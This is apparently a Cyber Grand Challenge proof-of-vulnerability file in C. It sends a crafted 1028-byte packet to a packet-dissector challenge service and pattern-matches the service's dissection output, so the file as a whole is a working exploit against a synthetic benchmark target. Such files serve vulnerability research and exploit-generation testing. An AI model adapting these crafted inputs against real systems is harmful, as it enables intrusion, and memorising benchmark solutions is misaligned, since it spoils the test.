#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x03\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\xdb\x81\xd8\x39"
         "\x7d\x0c\x7e\x40\xde\x61\x91\x41\xec\x01\x00\x00\x2e\x8f\xd5\x0d"
         "\x16\x96\xda\x79\x17\x5f\xec\xa0\x8f\xeb\x6a\x69\x5f\xe9\x3a\x6a"
         "\xfa\x6d\x8d\x07\x19\x00\x1a\x76\x16\xe5\x09\x00\x87\xf2\x04\xee"
         "\xe1\x42\x77\x10\xb0\xf1\xed\x79\x8c\xaa\x2c\xe5\x9d\xf0\x14\x05"
         "\x9d\x38\x5d\x6a\x43\xd6\x8e\x2b\x00\xa5\xaf\x80\x63\x79\x47\x14"
         "\x19\x3c\x9a\x90\x33\xc7\x43\x58\xd5\xac\x23\x37\xf4\xf4\x20\xe8"
         "\xde\x10\xfa\x3b\xa8\x1d\xfe\x78\x82\x50\x00\x20\x20\xc5\x13\x6f"
         "\x71\x72\xc9\x77\x64\x25\x98\x41\x66\x10\x2c\x07\x6c\x0a\x73\x88"
         "\xef\xe2\xb7\x1b\x9f\xd7\x2b\xa0\xb6\xa5\xb5\x76\xae\xda\x19\x19"
         "\x26\x7b\x6c\x86\x19\x00\xe6\x49\x8e\x99\xaa\x43\xfe\x02\x19\x00"
         "\x7e\x5b\xbb\x43\x15\x2b\xda\x22\xf5\x2e\x8a\x2e\x4b\x0a\x30\x7c"
         "\x1b\x7d\x17\x76\xf1\x93\xec\xbc\xc5\x49\x77\xa6\x0a\x1b\x6c\x74"
         "\xe9\x48\xda\x4e\x61\xb9\xca\x8c\xfe\x27\xa7\x98\x7e\xbf\xb6\xdd"
         "\x40\x56\xe9\x71\xf8\x65\xb7\xda\xb6\x12\x00\x13\x04\x4f\xc4\x2f"
         "\x6f\x17\x64\x78\xe6\x94\xb1\xdf\xc4\x22\x6c\x67\xf8\x30\x46\x63"
         "\x78\xf7\x46\x67\x37\x9f\xeb\x73\xbc\x86\x6f\xd6\xa5\x77\x16\xb2"
         "\x45\x53\x5a\x51\xf3\x35\x0c\xc3\x53\xde\xfd\x16\x5e\x4b\x61\xa4"
         "\x6a\xfd\x59\xd0\xd6\xff\xb1\x07\x82\x2d\x26\x97\x69\x00\xc4\x21"
         "\xc7\xae\x09\x50\x71\xe5\xbc\x23\x16\x1c\xb6\x21\xd6\x65\x56\x7c"
         "\x96\x56\xeb\xf0\x57\xaa\x70\xcb\x7e\x22\x25\x5e\x9d\x30\xec\x4f"
         "\x5e\x1e\xcf\x82\x51\xd6\xdd\x5e\x11\x3c\x52\x16\x78\xad\xda\x72"
         "\x6f\x2a\xe3\x72\x87\xb4\xcb\xee\x6e\x70\xc7\xb2\xe3\x0f\xed\xcf"
         "\xea\x10\x6b\x18\x4a\x69\xda\x31\x90\xe2\xee\x38\x4a\x0f\xfc\x36"
         "\x19\xf4\x47\x18\xf2\xd1\x57\x4c\xe6\xa7\x93\x36\xea\x85\x66\xbf"
         "\x50\x97\x03\xd2\x8f\xa4\xb8\x45\x91\x15\x80\xee\x0d\x36\xb9\xfb"
         "\xa7\x11\xeb\x2b\xc4\xc5\xee\x7a\xbc\x48\xec\x54\x36\xa4\xc2\x0e"
         "\xdf\x60\x00\x1f\xf7\x66\xdc\xea\xca\x60\xf2\x47\xc8\xf3\xce\xc9"
         "\x09\xfa\xdc\xb2\x4e\x89\x74\x30\x0b\x16\xdf\x5a\x36\x45\x1a\x05"
         "\x1e\x47\xab\xd2\x7a\x0a\xed\xbf\x67\x8f\x5b\x86\x8c\xae\x7c\xd9"
         "\x2a\x0c\xe1\x4e\x37\x37\x74\xc6\xda\x06\x74\xf5\xb2\xce\xf5\x35"
         "\x80\xdd\x3f\xab\x55\x70\x99\xf4\x1c\xd5\x51\xb6\xbe\x78\x7b\x05"
         "\xce\x8d\xff\x0b\x5c\x2d\x68\x70\x84\xbb\xe9\xaa\x21\x5b\x9a\x46"
         "\x25\x36\xf2\xb4\x22\xd6\x43\x99\x9a\x90\x8f\x4e\x24\xfb\xcb\x85"
         "\x1d\x7c\x13\xf1\xc8\xef\x9e\x9b\xf9\x0f\x5a\x95\xc9\xe9\x4a\x7f"
         "\xd2\x2a\x6c\x28\x5c\x00\xf9\xb0\x55\x5c\xae\x52\xed\xee\x87\xa4"
         "\x92\x57\xdb\xdc\xa1\x75\x1d\x5d\x5f\x79\x4b\xad\x05\xb8\x4c\xbe"
         "\x8b\xd8\x5e\x32\x6b\x40\xa2\x90\x6b\x9a\xcc\xf4\x92\x3c\x46\x96"
         "\x9a\x94\xa3\xdd\xcf\x66\x40\xbf\x78\x2e\x1e\x1a\x78\xc0\xfc\x5a"
         "\xee\x1e\x0d\x5a\x92\x97\xdd\xd7\xa1\xa7\xea\xea\x90\x81\xf3\x78"
         "\x85\x08\xf4\x47\xe5\x48\xb6\xb5\x74\xea\x89\xc4\x04\xa6\x3f\x48"
         "\xb1\xa3\x80\x64\x94\xd5\xe5\xb5\x8d\x74\xcb\x79\xa0\xdd\xa5\xd9"
         "\x14\x92\x0a\x37\xae\x66\x7d\xd5\x03\x5a\xca\xcb\xb3\x0c\xfd\x0d"
         "\xec\x3e\xf4\x19\x63\x5a\xd2\x49\xce\x4e\x1c\x18\x58\x97\xa9\x2a"
         "\x79\x48\xf0\xc0\xec\x0f\x83\x50\x6e\x13\xfb\xdd\x06\x69\x2c\x21"
         "\x76\xba\x2f\x26\x05\xc3\x35\x26\x3f\x54\xe7\x70\x28\xd1\x73\x55"
         "\xbb\xc2\x11\x58\x5a\xac\x59\x74\x67\x2b\x32\xc1\x06\x2e\xae\x69"
         "\x42\x07\x29\xb5\xff\xe9\x0b\x54\x24\xbd\x3b\x9c\x6d\xe5\x9f\x61"
         "\xb2\x7e\xa5\x65\x2f\x48\xd8\xc2\x00\xd5\x21\x65\xff\x11\xbe\x09"
         "\x5f\xa5\xca\xa2\x69\x89\x19\x5f\x81\xb6\x56\x8a\x07\xad\xe9\x90"
         "\xac\xfa\x96\xd6\xc7\xc4\x6f\x1f\x50\xe1\x50\x93\xfe\x23\x77\x4f"
         "\xd2\x65\xcd\x63\xbb\xe6\x9c\x9b\xee\x82\x8d\xb7\x67\xc6\xa4\xa3"
         "\xe7\x59\x6c\x8f\x85\xea\xa6\x7b\xa5\x84\xcd\xee\x18\xcb\x6f\x99"
         "\x4c\xd3\x40\x57\x54\x1f\xa7\x1b\x01\x69\x81\xb6\x71\xe5\xd1\xfb"
         "\x80\x7a\xfc\xd4\xbc\x14\xf4\x01\x98\x45\x21\xf3\xab\x1c\xf6\x7e"
         "\xbc\xd1\xb9\xf2\xf0\x27\x76\xce\xa4\x8e\x73\xb7\x92\xdc\x2a\xa0"
         "\x10\xc2\xfa\x68\x09\x6d\x7c\xce\x55\x5f\xa3\xca\x11\xfd\x65\x31"
         "\x99\xaf\x75\xd4\x64\x66\x33\xd1\xee\xfd\x12\xc9\x07\x48\x8b\x5f"
         "\x6b\x2a\x13\xed\x1d\xc8\x74\x63\x80\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===lol
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6f\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===rosiedunarchdeacon
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x73\x69\x65\x64\x75\x6e\x61\x72\x63"
         "\x68\x64\x65\x61\x63\x6f\x6e";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*===outworthbenevolence
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6f\x75\x74\x77\x6f\x72\x74\x68\x62\x65\x6e"
         "\x65\x76\x6f\x6c\x65\x6e\x63\x65";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00005;
      unsigned int read_00005_len;
      unsigned int read_00005_ptr = 0;
      //**** delimited read
      static unsigned char read_00005_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00005 = NULL;
      read_00005_len = 0;
      int read_00005_res = cgc_delimited_read(0, &read_00005, &read_00005_len, read_00005_delim, 4);
      if (read_00005_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00005_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00005_00000_match;
      pcre *read_00005_00000_pcre = cgc_init_regex(read_00005_00000_regex);
      if (read_00005_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00005_00000_pcre, 0, read_00005 + read_00005_ptr, read_00005_len - read_00005_ptr, &read_00005_00000_match);
         if (rc > 0) {
            read_00005_ptr += read_00005_00000_match.match_end - read_00005_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00005_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00005);
      if (read_00005_ptr) {}  //silence unused variable warning if any
   } while (0);
}
